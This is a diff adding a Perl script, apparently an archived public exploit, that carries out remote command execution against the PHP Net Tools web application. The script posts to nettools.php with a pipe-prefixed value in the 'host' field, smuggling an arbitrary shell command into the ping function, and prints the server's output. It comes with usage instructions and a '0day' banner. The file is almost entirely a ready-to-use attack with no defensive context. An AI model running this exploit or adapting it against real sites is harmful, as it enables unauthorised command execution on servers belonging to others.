@@ -1,0 +1,52 @@
+#!/usr/bin/perl
+# PHP Net Tools Remote Code Execution Exploit
+#
+# by FOX_MULDER (fox_mulder@abv.bg)
+# Vulnerability found by FOX_MULDER.
+#
+# "Born to be root !!!"
+#----------------------------------+
+#PHP Net Tools                     |
+#Copyright (C) 2005 Eric Robertson |
+#h4rdc0d3@gmail.com                |
+#----------------------------------+
+#
+# Fact:Wbyte counted twice to infinity !!!
+#
+#
+###################################################
+	use LWP 5.64;
+
+	my $hostname = $ARGV[0];
+	my $dir = $ARGV[1];
+	my $command = $ARGV[2];
+
+        if (@ARGV<2) {
+	print "\nUsage: ntools.pl www.site.com /dir/ \"ls \-la\" \n";
+	exit();
+	}
+	
+	print "=======================================================\n";
+	print "0day 0day 0day 0day 0day 0day 0day 0day 0day 0day 0day\n";
+	print "PHP Net Tools Command Execution Exploit by FOX_MULDER\n";
+	print "fox_mulder@abv.bg\r\n";
+	print "=======================================================\n";
+
+	my $browser = LWP::UserAgent->new;
+	$browser->agent('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)');
+	print "\n\n[+]Sending request to server . . .\r\n";
+	
+	my $url = "http://$hostname$dir/nettools.php";
+
+	
+	my $response = $browser->post( $url,[
+		'ping' => '1',
+        	'host' => "|$command"]);
+
+ 	my $code = $response->status_line;
+        print "[+] HTTP RESPONSE $code\n";
+        print "\n[+]Injecting command . . .\n";
+	$response->content =~ /blockquote>(.*)<\/blockquote>/s;
+	print "$1\n";
+
+# milw0rm.com [2006-04-18]
